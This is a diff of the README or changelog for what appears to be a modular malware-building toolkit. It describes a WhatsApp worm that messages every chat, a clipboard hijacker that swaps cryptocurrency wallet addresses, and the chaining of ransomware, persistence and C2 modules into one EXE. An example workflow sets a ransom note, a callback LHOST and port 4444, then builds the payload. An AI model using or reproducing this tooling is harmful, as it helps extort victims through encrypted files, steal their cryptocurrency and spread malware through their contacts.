@@ -1,14 +1,13 @@
 ## What's New
 
 ### VERSION 0.1.4
-- **New Module: `daemon/bartmossbrainworm`** - Messaging worm
+- **New Module: `bartmossbrainworm`** - Messaging worm
 - **Features:**
   - Spreads itself by automatically sending a configurable message to all chats in WhatsApp Web
   - The message can be set using the `set MESSAGE "your text"` command before build
-  - Worm-like propagation via messaging apps
 
 ### VERSION 0.1.3
-- **New Module: `daemon/gremlin`** - Clipboard wallet address hijacker
+- **New Module: `gremlin`** - Clipboard wallet address hijacker
 - **Features:**
   - Monitors clipboard for copied wallet addresses (Bitcoin, Ethereum, BEP-20, Solana)
   - Automatically replaces detected wallet addresses with user-configurable predefined addresses
@@ -27,7 +26,6 @@
 
 - **Modular Payloads:** Chain multiple modules (ransomware, persistence, C2, etc.) into a single EXE.
 - **Customizable Options:** Configure module and build options (e.g., ransom note, C2 port, EXE name).
-- **Messaging Worm Module:** `daemon/bartmossbrainworm` can send a custom message to all WhatsApp chats, simulating worm-like spread.
 - `use <module>` — Add a module to the build chain
 - `set <OPTION> <VALUE>` — Set build/module options
 - `show modules` — List available modules
@@ -42,9 +40,9 @@
 ### Example Workflow
 ```
 > show modules
-> use daemon/krash
+> use krash
 > set NOTE "Your files have been encrypted! Contact evil@domain.com."
-> use daemon/silverhandghost
+> use silverhandghost
 > set LHOST 192.168.1.10
 > set LPORT 4444
 > build
